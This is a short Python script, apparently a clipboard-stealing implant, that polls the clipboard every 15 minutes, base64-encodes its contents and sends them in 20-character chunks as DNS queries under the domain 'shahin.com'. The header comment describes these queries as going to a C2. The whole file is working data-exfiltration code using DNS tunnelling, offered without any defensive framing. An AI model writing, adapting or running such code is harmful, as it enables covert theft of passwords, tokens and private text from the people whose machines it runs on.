#! python3
# This program will paste whatever is in the clipboard every 15 minutes encapsulate
# into DNS payload and send to C2

import pyperclip, os, dnslib, base64, dns.resolver, socket, time

# Function to paste contents of clipboard and encode data into base64

def pasteClipBoard():
    data = pyperclip.paste()
    encodedData = base64.b64encode(data.encode()).decode() + '!EN!'
    print('EncodedDataFromClipboard: ', encodedData)
    return encodedData

# encapsulate data


def sendPayload(encodedData,domain, dns_server):
    try:
        chunkSize = 20
        if len(encodedData) > chunkSize:
            chunks = [encodedData[i:i + chunkSize] for i in range(0, len(encodedData), chunkSize)]
        else:
            chunks = [encodedData]
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        client_socket.connect((dns_server, 53))

        # Send a DNS query for each chunk
        for chunk in chunks:
            qtype = dnslib.QTYPE = 'A'
            qname = f"{chunk}.{domain}"
            dns_query = dnslib.DNSRecord.question(qname, qtype)
            print(dns_query)
            client_socket.send(dns_query.pack())

        client_socket.close()
    except Exception as e:
        print(f"An error occurred while sending the DNS query: {e}")


# main
# Set variable to save previous value of clipboard
previousValue = None
while True:
    currentValue = pyperclip.paste()
    if previousValue is not None and currentValue == previousValue:
        time.sleep(15 * 60)
    else:
        payload = pasteClipBoard()
        sendPayload(payload, 'shahin.com', '127.0.0.1')
        previousValue = currentValue
    # Sleep for 15 minutes
    time.sleep(15 * 60)
